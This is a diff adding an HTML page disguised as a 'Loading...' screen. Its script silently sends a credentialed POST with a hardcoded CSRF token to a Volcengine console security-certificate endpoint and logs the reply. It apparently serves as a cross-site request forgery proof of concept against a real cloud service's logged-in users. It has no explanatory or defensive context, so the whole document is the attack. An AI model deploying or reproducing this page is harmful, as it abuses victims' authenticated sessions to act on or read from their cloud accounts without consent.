@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+  <p>页面加载中...</p>
+  <script>
+    fetch('https://console.volcengine.com/api/passport/security/encCerts', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-CSRF-TOKEN': '8b13c7ddf17a645320fff792b453c01c'
+      },
+      body: '{}'
+    }).then(r => r.text())
+      .then(data => console.log(data))
+      .catch(err => console.error('Error:', err));
+  </script>
+</body>
+</html>
